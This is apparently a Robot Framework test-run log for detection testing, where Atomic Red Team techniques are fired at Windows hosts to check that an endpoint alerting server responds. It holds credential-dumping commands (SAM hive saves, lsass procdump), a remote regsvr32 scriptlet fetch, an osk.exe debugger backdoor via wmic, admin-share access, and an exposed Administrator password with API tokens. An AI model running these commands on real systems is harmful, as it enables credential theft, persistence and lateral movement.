@@ -1,0 +1,542 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<robot rpa="false" generated="20190826 14:28:25.614" generator="Robot 3.1.2 (Python 2.7.12 on linux2)">
+<suite source="/home/asm/work/testing/server_test_cases/Endgame_RTA_Alert_Test.robot" id="s1" name="Endgame RTA Alert Test">
+<test id="s1-t1" name="Get the Base URL for API Connect">
+<kw name="Get Url" library="Poly_API_get">
+<arguments>
+<arg>${server_ip}</arg>
+</arguments>
+<assign>
+<var>${base_url}</var>
+</assign>
+<msg timestamp="20190826 14:28:25.893" level="INFO">${base_url} = https://13.127.198.209:5000/services/api/v0</msg>
+<status status="PASS" endtime="20190826 14:28:25.893" starttime="20190826 14:28:25.892"></status>
+</kw>
+<kw name="Set Global Variable" library="BuiltIn">
+<doc>Makes a variable available globally in all tests and suites.</doc>
+<arguments>
+<arg>${base_url}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:25.893" level="INFO">${base_url} = https://13.127.198.209:5000/services/api/v0</msg>
+<status status="PASS" endtime="20190826 14:28:25.894" starttime="20190826 14:28:25.893"></status>
+</kw>
+<doc>Gets the base url of server</doc>
+<tags>
+<tag>REST API Base URL</tag>
+</tags>
+<status status="PASS" endtime="20190826 14:28:25.894" critical="yes" starttime="20190826 14:28:25.891"></status>
+</test>
+<test id="s1-t2" name="Get API Responses of Endpoint nodes">
+<kw name="Get Endpoint" library="Poly_API_get">
+<arguments>
+<arg>nodes</arg>
+</arguments>
+<assign>
+<var>${endpoint}</var>
+</assign>
+<msg timestamp="20190826 14:28:25.895" level="INFO">${endpoint} = nodes</msg>
+<status status="PASS" endtime="20190826 14:28:25.895" starttime="20190826 14:28:25.895"></status>
+</kw>
+<kw name="Get x-token">
+<assign>
+<var>${token}</var>
+</assign>
+<kw name="Get Token" library="Poly_API_get">
+<arguments>
+<arg>${server_ip}</arg>
+</arguments>
+<assign>
+<var>${token}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.652" level="INFO">${token} = eyJhbGciOiJIUzUxMiIsImlhdCI6MTU2NjgwOTkwNiwiZXhwIjoxNTY2ODEwNTA2fQ.eyJpZCI6MX0.iCNaDlUfPmbsuqk6IKIqnF5n9vR-qL7qOJIFc5VrciaWPqSKQFsbtjNe3pG49jo9FZ_4nlpgWDtVvJuUYdATrw</msg>
+<status status="PASS" endtime="20190826 14:28:26.652" starttime="20190826 14:28:25.896"></status>
+</kw>
+<msg timestamp="20190826 14:28:26.653" level="INFO">${token} = eyJhbGciOiJIUzUxMiIsImlhdCI6MTU2NjgwOTkwNiwiZXhwIjoxNTY2ODEwNTA2fQ.eyJpZCI6MX0.iCNaDlUfPmbsuqk6IKIqnF5n9vR-qL7qOJIFc5VrciaWPqSKQFsbtjNe3pG49jo9FZ_4nlpgWDtVvJuUYdATrw</msg>
+<status status="PASS" endtime="20190826 14:28:26.653" starttime="20190826 14:28:25.895"></status>
+</kw>
+<kw name="CONNECT API">
+<arguments>
+<arg>${base_url}</arg>
+<arg>${endpoint}</arg>
+<arg>${token}</arg>
+</arguments>
+<assign>
+<var>${Result}</var>
+</assign>
+<kw name="Call API" library="Poly_API_get">
+<arguments>
+<arg>${base_url}</arg>
+<arg>${endpoint}</arg>
+<arg>${token}</arg>
+</arguments>
+<assign>
+<var>${API_object}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.656" level="INFO">${API_object} = &lt;Poly_API_get.Connect_API instance at 0x7fc8129adc68&gt;</msg>
+<status status="PASS" endtime="20190826 14:28:26.656" starttime="20190826 14:28:26.655"></status>
+</kw>
+<msg timestamp="20190826 14:28:26.964" level="INFO">${Result} = {u'status': u'success', u'message': u'nodes data fetched successfully', u'data': [{u'tags': [u'windows'], u'last_checkin': u'2019-08-10T20:30:51.254423', u'node_info': {u'cpu_physical_cores': u'1', u'...</msg>
+<status status="PASS" endtime="20190826 14:28:26.964" starttime="20190826 14:28:26.654"></status>
+</kw>
+<kw name="Get Host Id" library="Poly_API_get">
+<arguments>
+<arg>${Result}</arg>
+</arguments>
+<assign>
+<var>${Host_id}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.966" level="INFO">${Host_id} = {'windows': [u'EC2FAD08-7142-C98B-219F-3D7F561EBB0B', u'EC295B97-8F81-2B8B-802C-4110D66365E4', u'4C4C4544-0038-4D10-804D-B1C04F354253', u'4C4C4544-004B-4D10-804E-CAC04F354253', u'EC2300D6-B0D5-F9A6-12...</msg>
+<status status="PASS" endtime="20190826 14:28:26.966" starttime="20190826 14:28:26.965"></status>
+</kw>
+<kw name="Log" library="BuiltIn">
+<doc>Logs the given message with the given level.</doc>
+<arguments>
+<arg>${Host_id}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:26.966" level="INFO">{'windows': [u'EC2FAD08-7142-C98B-219F-3D7F561EBB0B', u'EC295B97-8F81-2B8B-802C-4110D66365E4', u'4C4C4544-0038-4D10-804D-B1C04F354253', u'4C4C4544-004B-4D10-804E-CAC04F354253', u'EC2300D6-B0D5-F9A6-1237-6553106EC525', u'4C4C4544-004C-3010-8051-CAC04F565131', u'EC20ECBF-83DF-014A-3212-A10805A94CFE', u'EC2B4BDE-B7D6-70E5-23F0-5079ECEEFBB0', u'EC2912B1-2AA2-F836-63AE-D85B0EA676BA', u'EC24D8DB-D86B-7E2F-5221-7A43C7F6A9E1', u'EC2DB947-7A57-FF58-4BA0-225FA51FF614', u'4C4C4544-0038-4A10-8031-C2C04F543032', u'EC27B624-F73B-BA71-BCAB-59796BBB14B3', u'EC276F9F-AF38-5498-ACE2-22358A2094F5', u'EC270B92-95EA-C622-5A9B-A745A4CCFD91', u'EC276F9F-AF38-5498-ACE2-22358A2094F5', u'C972C4E2-93AD-52D5-A5E8-5239E50A2993', u'74a85ed0d6ea', u'd705a7dcdfe0', u'FE570681-5218-11CB-A7FD-F84C190DD0B3', u'b50fa53a4974', u'7c7c763cbf9d', u'EC297B21-F6FC-C1C0-6D99-AADA9C1ECE7B', u'7fe569714ae7', u'EC27B624-F73B-BA71-BCAB-59796BBB14B3'], 'ubuntu': [u'EC2BCC88-43FB-D57B-DC69-08875718B276', u'EC241E83-BDC2-CAFC-BF9F-28C22B37A7F0']}</msg>
+<status status="PASS" endtime="20190826 14:28:26.966" starttime="20190826 14:28:26.966"></status>
+</kw>
+<kw name="Set Global Variable" library="BuiltIn">
+<doc>Makes a variable available globally in all tests and suites.</doc>
+<arguments>
+<arg>${Host_id}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:26.967" level="INFO">${Host_id} = {'windows': [u'EC2FAD08-7142-C98B-219F-3D7F561EBB0B', u'EC295B97-8F81-2B8B-802C-4110D66365E4', u'4C4C4544-0038-4D10-804D-B1C04F354253', u'4C4C4544-004B-4D10-804E-CAC04F354253', u'EC2300D6-B0D5-F9A6-12...</msg>
+<status status="PASS" endtime="20190826 14:28:26.967" starttime="20190826 14:28:26.967"></status>
+</kw>
+<kw name="Get Hostname" library="Poly_API_get">
+<arguments>
+<arg>${Result}</arg>
+</arguments>
+<assign>
+<var>${host_Name}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.968" level="INFO">${host_Name} = [u'WIN-MK83A72EAQK', u'EC2AMAZ-DTOTSH8', u'asm-Vostro-230', u'asm-Vostro-230', u'ip-172-31-30-207', u'ip-172-31-24-42', u'EC2AMAZ-S3MJAFR', u'ASM-PC', u'EC2AMAZ-TCA8E2S', u'EC2AMAZ-2RJ1BIF', u'EC2AMAZ...</msg>
+<status status="PASS" endtime="20190826 14:28:26.968" starttime="20190826 14:28:26.967"></status>
+</kw>
+<kw name="Log" library="BuiltIn">
+<doc>Logs the given message with the given level.</doc>
+<arguments>
+<arg>${host_Name}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:26.968" level="INFO">[u'WIN-MK83A72EAQK', u'EC2AMAZ-DTOTSH8', u'asm-Vostro-230', u'asm-Vostro-230', u'ip-172-31-30-207', u'ip-172-31-24-42', u'EC2AMAZ-S3MJAFR', u'ASM-PC', u'EC2AMAZ-TCA8E2S', u'EC2AMAZ-2RJ1BIF', u'EC2AMAZ-2RJ1BIF', u'EC2AMAZ-2RJ1BIF', u'EC2AMAZ-VFQT0R3', u'ASM-PC-NPR', u'EC2AMAZ-7QBKQJL', u'EC2AMAZ-EU8BFG7', u'EC2AMAZ-STU2L24', u'EC2AMAZ-EU8BFG7', u'', u'74a85ed0d6ea', u'd705a7dcdfe0', u'asm-ThinkPad-Edge-E430', u'b50fa53a4974', u'7c7c763cbf9d', u'EC2AMAZ-DLB1OA3', u'7fe569714ae7', u'EC2AMAZ-7QBKQJL']</msg>
+<status status="PASS" endtime="20190826 14:28:26.968" starttime="20190826 14:28:26.968"></status>
+</kw>
+<kw name="Set Global Variable" library="BuiltIn">
+<doc>Makes a variable available globally in all tests and suites.</doc>
+<arguments>
+<arg>${host_Name}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:26.969" level="INFO">${host_Name} = [u'WIN-MK83A72EAQK', u'EC2AMAZ-DTOTSH8', u'asm-Vostro-230', u'asm-Vostro-230', u'ip-172-31-30-207', u'ip-172-31-24-42', u'EC2AMAZ-S3MJAFR', u'ASM-PC', u'EC2AMAZ-TCA8E2S', u'EC2AMAZ-2RJ1BIF', u'EC2AMAZ...</msg>
+<status status="PASS" endtime="20190826 14:28:26.969" starttime="20190826 14:28:26.968"></status>
+</kw>
+<kw name="Should Be Equal" library="BuiltIn">
+<doc>Fails if the given objects are unequal.</doc>
+<arguments>
+<arg>success</arg>
+<arg>${Result['status']}</arg>
+</arguments>
+<status status="PASS" endtime="20190826 14:28:26.970" starttime="20190826 14:28:26.969"></status>
+</kw>
+<doc>Connects to the API and gets the responses of endpoint nodes</doc>
+<tags>
+<tag>REST API GET Responses</tag>
+</tags>
+<status status="PASS" endtime="20190826 14:28:26.970" critical="yes" starttime="20190826 14:28:25.894"></status>
+</test>
+<test id="s1-t3" name="Get Responses of target_name Remote System Discovery net_37">
+<kw name="Create List" library="BuiltIn">
+<doc>Returns a list containing given items.</doc>
+<arguments>
+<arg>net view /domain</arg>
+<arg>net view</arg>
+</arguments>
+<assign>
+<var>@{cmd_names}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.971" level="INFO">@{cmd_names} = [ net view /domain | net view ]</msg>
+<status status="PASS" endtime="20190826 14:28:26.971" starttime="20190826 14:28:26.971"></status>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>view</arg>
+</arguments>
+<assign>
+<var>${target_n}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.972" level="INFO">${target_n} = view</msg>
+<status status="PASS" endtime="20190826 14:28:26.972" starttime="20190826 14:28:26.972"></status>
+</kw>
+<kw name="Loop for do_ssh">
+<arguments>
+<arg>@{cmd_name}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:26.972" level="FAIL">Value of variable '@{cmd_name}' is not list or list-like.</msg>
+<status status="FAIL" endtime="20190826 14:28:26.972" starttime="20190826 14:28:26.972"></status>
+</kw>
+<doc>The responses of Remote System Discovery net</doc>
+<tags>
+<tag>Red Canary Atomic T1018 Defense Evasion Execution</tag>
+</tags>
+<status status="FAIL" endtime="20190826 14:28:26.973" critical="yes" starttime="20190826 14:28:26.970">Value of variable '@{cmd_name}' is not list or list-like.</status>
+</test>
+<test id="s1-t4" name="Get Responses of target_name Regsvr32 remote COM scriptlet execution_38">
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll</arg>
+</arguments>
+<assign>
+<var>${cmd_name}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.974" level="INFO">${cmd_name} = regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll</msg>
+<status status="PASS" endtime="20190826 14:28:26.974" starttime="20190826 14:28:26.974"></status>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll</arg>
+</arguments>
+<assign>
+<var>${target_n}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.975" level="INFO">${target_n} = regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll</msg>
+<status status="PASS" endtime="20190826 14:28:26.975" starttime="20190826 14:28:26.974"></status>
+</kw>
+<kw name="Do Ssh" library="Red_Canary_Atomic">
+<arguments>
+<arg>${windows_host_ip}</arg>
+<arg>pass</arg>
+<arg>${cmd_names}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:26.976" level="FAIL">Variable '${cmd_names}' not found. Did you mean:
+    ${cmd_name}</msg>
+<status status="FAIL" endtime="20190826 14:28:26.976" starttime="20190826 14:28:26.975"></status>
+</kw>
+<doc>The responses of Regsvr32 remote COM scriptlet execution</doc>
+<tags>
+<tag>Red Canary Atomic T1117 Defense Evasion Execution</tag>
+</tags>
+<status status="FAIL" endtime="20190826 14:28:26.977" critical="yes" starttime="20190826 14:28:26.973">Variable '${cmd_names}' not found. Did you mean:
+    ${cmd_name}</status>
+</test>
+<test id="s1-t5" name="Get Responses of target_name Credential Dumping_39">
+<kw name="Create List" library="BuiltIn">
+<doc>Returns a list containing given items.</doc>
+<arguments>
+<arg>reg save HKLM\\sam sam</arg>
+<arg>reg save HKLM\\system system</arg>
+<arg>reg save HKLM\\security security</arg>
+</arguments>
+<assign>
+<var>@{cmd_names}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.979" level="INFO">@{cmd_names} = [ reg save HKLM\sam sam | reg save HKLM\system system | reg save HKLM\security security ]</msg>
+<status status="PASS" endtime="20190826 14:28:26.979" starttime="20190826 14:28:26.978"></status>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>system</arg>
+</arguments>
+<assign>
+<var>${target_n}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.979" level="INFO">${target_n} = system</msg>
+<status status="PASS" endtime="20190826 14:28:26.979" starttime="20190826 14:28:26.979"></status>
+</kw>
+<kw name="Loop for do_ssh">
+<arguments>
+<arg>@{cmd_name}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:26.980" level="FAIL">Value of variable '@{cmd_name}' is not list or list-like.</msg>
+<status status="FAIL" endtime="20190826 14:28:26.980" starttime="20190826 14:28:26.979"></status>
+</kw>
+<doc>The responses of Credential Dumping</doc>
+<tags>
+<tag>Red Canary Atomic T1003 Defense Evasion Execution</tag>
+</tags>
+<status status="FAIL" endtime="20190826 14:28:26.980" critical="yes" starttime="20190826 14:28:26.977">Value of variable '@{cmd_name}' is not list or list-like.</status>
+</test>
+<test id="s1-t6" name="Get Responses of target_name Dump LSASS.exe Memory using ProcDump_40">
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>C:\\Users\\Administrator\\Downloads\\Procdump\\procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp</arg>
+</arguments>
+<assign>
+<var>${cmd_name}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.982" level="INFO">${cmd_name} = C:\Users\Administrator\Downloads\Procdump\procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp</msg>
+<status status="PASS" endtime="20190826 14:28:26.982" starttime="20190826 14:28:26.982"></status>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>lsass_dump.dmp</arg>
+</arguments>
+<assign>
+<var>${target_n}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.983" level="INFO">${target_n} = lsass_dump.dmp</msg>
+<status status="PASS" endtime="20190826 14:28:26.983" starttime="20190826 14:28:26.983"></status>
+</kw>
+<kw name="Do Ssh" library="Red_Canary_Atomic">
+<arguments>
+<arg>${windows_host_ip}</arg>
+<arg>pass</arg>
+<arg>${cmd_names}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:26.984" level="FAIL">Variable '${cmd_names}' not found. Did you mean:
+    ${cmd_name}</msg>
+<status status="FAIL" endtime="20190826 14:28:26.984" starttime="20190826 14:28:26.983"></status>
+</kw>
+<doc>The responses of Credential Dumping</doc>
+<tags>
+<tag>Red Canary Atomic T1003 Defense Evasion Execution</tag>
+</tags>
+<status status="FAIL" endtime="20190826 14:28:26.985" critical="yes" starttime="20190826 14:28:26.981">Variable '${cmd_names}' not found. Did you mean:
+    ${cmd_name}</status>
+</test>
+<test id="s1-t7" name="Get Responses of target_name Windows Remote Management_41">
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>wmic /user:Administrator /password:NK@wtynrsmfDU4pC$X$?rT?Ne2k-m%=p /node:EC2AMAZ-TCA8E2S process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"</arg>
+</arguments>
+<assign>
+<var>${cmd_name}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.986" level="INFO">${cmd_name} = wmic /user:Administrator /password:NK@wtynrsmfDU4pC$X$?rT?Ne2k-m%=p /node:EC2AMAZ-TCA8E2S process call create "C:Windowssystem32eg.exe add "HKLMSOFTWAREMicrosoftWindows NTCurrentVersionImage File Exe...</msg>
+<status status="PASS" endtime="20190826 14:28:26.986" starttime="20190826 14:28:26.986"></status>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>NK@wtynrsmfDU4pC$X$?rT?Ne2k-m%=p</arg>
+</arguments>
+<assign>
+<var>${target_n}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.987" level="INFO">${target_n} = NK@wtynrsmfDU4pC$X$?rT?Ne2k-m%=p</msg>
+<status status="PASS" endtime="20190826 14:28:26.987" starttime="20190826 14:28:26.987"></status>
+</kw>
+<kw name="Do Ssh" library="Red_Canary_Atomic">
+<arguments>
+<arg>${windows_host_ip}</arg>
+<arg>pass</arg>
+<arg>${cmd_names}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:26.988" level="FAIL">Variable '${cmd_names}' not found. Did you mean:
+    ${cmd_name}</msg>
+<status status="FAIL" endtime="20190826 14:28:26.988" starttime="20190826 14:28:26.987"></status>
+</kw>
+<doc>The responses of Windows Remote Management</doc>
+<tags>
+<tag>Red Canary Atomic T1028 Execution, Lateral Movement</tag>
+</tags>
+<status status="FAIL" endtime="20190826 14:28:26.989" critical="yes" starttime="20190826 14:28:26.985">Variable '${cmd_names}' not found. Did you mean:
+    ${cmd_name}</status>
+</test>
+<test id="s1-t8" name="Get Responses of target_name Windows Admin Shares_42">
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>cmd.exe /c "net use \\EC2AMAZ-TCA8E2S\C$ NK@wtynrsmfDU4pC$X$?rT?Ne2k-m%=p /u:Administrator"</arg>
+</arguments>
+<assign>
+<var>${cmd_name}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.990" level="INFO">${cmd_name} = cmd.exe /c "net use \EC2AMAZ-TCA8E2SC$ NK@wtynrsmfDU4pC$X$?rT?Ne2k-m%=p /u:Administrator"</msg>
+<status status="PASS" endtime="20190826 14:28:26.990" starttime="20190826 14:28:26.990"></status>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>NK@wtynrsmfDU4pC$X$?rT?Ne2k-m%=p</arg>
+</arguments>
+<assign>
+<var>${target_n}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.991" level="INFO">${target_n} = NK@wtynrsmfDU4pC$X$?rT?Ne2k-m%=p</msg>
+<status status="PASS" endtime="20190826 14:28:26.991" starttime="20190826 14:28:26.991"></status>
+</kw>
+<kw name="Do Ssh" library="Red_Canary_Atomic">
+<arguments>
+<arg>${windows_host_ip}</arg>
+<arg>pass</arg>
+<arg>${cmd_names}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:26.993" level="FAIL">Variable '${cmd_names}' not found. Did you mean:
+    ${cmd_name}</msg>
+<status status="FAIL" endtime="20190826 14:28:26.993" starttime="20190826 14:28:26.991"></status>
+</kw>
+<doc>The responses of Windows Admin Shares</doc>
+<tags>
+<tag>Red Canary Atomic T1077 Lateral Movement</tag>
+</tags>
+<status status="FAIL" endtime="20190826 14:28:26.994" critical="yes" starttime="20190826 14:28:26.989">Variable '${cmd_names}' not found. Did you mean:
+    ${cmd_name}</status>
+</test>
+<test id="s1-t9" name="Get Responses of target_name Remote File Copy_43">
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>cmd.exe /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\LICENSE.txt</arg>
+</arguments>
+<assign>
+<var>${cmd_name}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.995" level="INFO">${cmd_name} = cmd.exe /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\Administrator\Downloads\atomic-red-team-master\LICENSE.txt</msg>
+<status status="PASS" endtime="20190826 14:28:26.995" starttime="20190826 14:28:26.995"></status>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>-urlcache</arg>
+</arguments>
+<assign>
+<var>${target_n}</var>
+</assign>
+<msg timestamp="20190826 14:28:26.996" level="INFO">${target_n} = -urlcache</msg>
+<status status="PASS" endtime="20190826 14:28:26.996" starttime="20190826 14:28:26.996"></status>
+</kw>
+<kw name="Do Ssh" library="Red_Canary_Atomic">
+<arguments>
+<arg>${windows_host_ip}</arg>
+<arg>pass</arg>
+<arg>${cmd_names}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:26.998" level="FAIL">Variable '${cmd_names}' not found. Did you mean:
+    ${cmd_name}</msg>
+<status status="FAIL" endtime="20190826 14:28:26.998" starttime="20190826 14:28:26.996"></status>
+</kw>
+<doc>The responses of Remote File Copy</doc>
+<tags>
+<tag>Red Canary Atomic T1105 Command And Control, Lateral Movement</tag>
+</tags>
+<status status="FAIL" endtime="20190826 14:28:26.998" critical="yes" starttime="20190826 14:28:26.994">Variable '${cmd_names}' not found. Did you mean:
+    ${cmd_name}</status>
+</test>
+<test id="s1-t10" name="Get Responses of target_name Remote File Copy_44">
+<kw name="Get x-token">
+<assign>
+<var>${token}</var>
+</assign>
+<kw name="Get Token" library="Poly_API_get">
+<arguments>
+<arg>${server_ip}</arg>
+</arguments>
+<assign>
+<var>${token}</var>
+</assign>
+<msg timestamp="20190826 14:28:27.780" level="INFO">${token} = eyJhbGciOiJIUzUxMiIsImlhdCI6MTU2NjgwOTkwNywiZXhwIjoxNTY2ODEwNTA3fQ.eyJpZCI6MX0.10xB7KjltKKWvk5-QXFmk2-_UdMa6wlepVaX5X9Fjd1FjyoNP09MznAsNHMnqutMHZGTJjBx2JjyfLcG0l0e0A</msg>
+<status status="PASS" endtime="20190826 14:28:27.780" starttime="20190826 14:28:27.000"></status>
+</kw>
+<msg timestamp="20190826 14:28:27.781" level="INFO">${token} = eyJhbGciOiJIUzUxMiIsImlhdCI6MTU2NjgwOTkwNywiZXhwIjoxNTY2ODEwNTA3fQ.eyJpZCI6MX0.10xB7KjltKKWvk5-QXFmk2-_UdMa6wlepVaX5X9Fjd1FjyoNP09MznAsNHMnqutMHZGTJjBx2JjyfLcG0l0e0A</msg>
+<status status="PASS" endtime="20190826 14:28:27.781" starttime="20190826 14:28:26.999"></status>
+</kw>
+<kw name="Create List" library="BuiltIn">
+<doc>Returns a list containing given items.</doc>
+<arguments>
+<arg>cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe $datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"</arg>
+<arg>cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe New-Item -Path $datePath -ItemType Directory</arg>
+<arg>cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Setr-Location $datePath</arg>
+<arg>cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt</arg>
+<arg>cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach -Object { Move-Item $_.Name -Destination C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\LICENSE.txt }</arg>
+</arguments>
+<assign>
+<var>@{cmd_names}</var>
+</assign>
+<msg timestamp="20190826 14:28:27.782" level="INFO">@{cmd_names} = [ cmd /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)" | cmd /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe New-It...</msg>
+<status status="PASS" endtime="20190826 14:28:27.783" starttime="20190826 14:28:27.781"></status>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>certutil.exe</arg>
+</arguments>
+<assign>
+<var>${target_n}</var>
+</assign>
+<msg timestamp="20190826 14:28:27.783" level="INFO">${target_n} = certutil.exe</msg>
+<status status="PASS" endtime="20190826 14:28:27.784" starttime="20190826 14:28:27.783"></status>
+</kw>
+<kw name="Loop for do_ssh">
+<arguments>
+<arg>@{cmd_name}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:27.784" level="FAIL">Value of variable '@{cmd_name}' is not list or list-like.</msg>
+<status status="FAIL" endtime="20190826 14:28:27.785" starttime="20190826 14:28:27.784"></status>
+</kw>
+<doc>The responses of Remote File Copy</doc>
+<tags>
+<tag>Red Canary Atomic T1105 Command And Control, Lateral Movement</tag>
+</tags>
+<status status="FAIL" endtime="20190826 14:28:27.785" critical="yes" starttime="20190826 14:28:26.999">Value of variable '@{cmd_name}' is not list or list-like.</status>
+</test>
+<test id="s1-t11" name="Get Responses of target_name Remote File Copy_45">
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>C:\\windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\LICENSE.txt</arg>
+</arguments>
+<assign>
+<var>${cmd_name}</var>
+</assign>
+<msg timestamp="20190826 14:28:27.788" level="INFO">${cmd_name} = C:\windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\Administrator\Downloads\atomic-red-team-mast...</msg>
+<status status="PASS" endtime="20190826 14:28:27.789" starttime="20190826 14:28:27.787"></status>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<arguments>
+<arg>qcxjb7</arg>
+</arguments>
+<assign>
+<var>${target_n}</var>
+</assign>
+<msg timestamp="20190826 14:28:27.790" level="INFO">${target_n} = qcxjb7</msg>
+<status status="PASS" endtime="20190826 14:28:27.790" starttime="20190826 14:28:27.789"></status>
+</kw>
+<kw name="Do Ssh" library="Red_Canary_Atomic">
+<arguments>
+<arg>${windows_host_ip}</arg>
+<arg>pass</arg>
+<arg>${cmd_names}</arg>
+</arguments>
+<msg timestamp="20190826 14:28:27.793" level="FAIL">Variable '${cmd_names}' not found. Did you mean:
+    ${cmd_name}</msg>
+<status status="FAIL" endtime="20190826 14:28:27.793" starttime="20190826 14:28:27.790"></status>
+</kw>
+<doc>The responses of Remote File Copy</doc>
+<tags>
+<tag>Red Canary Atomic T1105 Command And Control, Lateral Movement</tag>
+</tags>
+<status status="FAIL" endtime="20190826 14:28:27.793" critical="yes" starttime="20190826 14:28:27.786">Variable '${cmd_names}' not found. Did you mean:
+    ${cmd_name}</status>
+</test>
+<status status="FAIL" endtime="20190826 14:28:27.794" starttime="20190826 14:28:25.615"></status>
+</suite>
+<statistics>
+<total>
+<stat fail="9" pass="2">Critical Tests</stat>
+<stat fail="9" pass="2">All Tests</stat>
+</total>
+<tag>
+<stat fail="2" pass="0">Red Canary Atomic T1003 Defense Evasion Execution</stat>
+<stat fail="1" pass="0">Red Canary Atomic T1018 Defense Evasion Execution</stat>
+<stat fail="1" pass="0">Red Canary Atomic T1028 Execution, Lateral Movement</stat>
+<stat fail="1" pass="0">Red Canary Atomic T1077 Lateral Movement</stat>
+<stat fail="3" pass="0">Red Canary Atomic T1105 Command And Control, Lateral Movement</stat>
+<stat fail="1" pass="0">Red Canary Atomic T1117 Defense Evasion Execution</stat>
+<stat fail="0" pass="1">REST API Base URL</stat>
+<stat fail="0" pass="1">REST API GET Responses</stat>
+</tag>
+<suite>
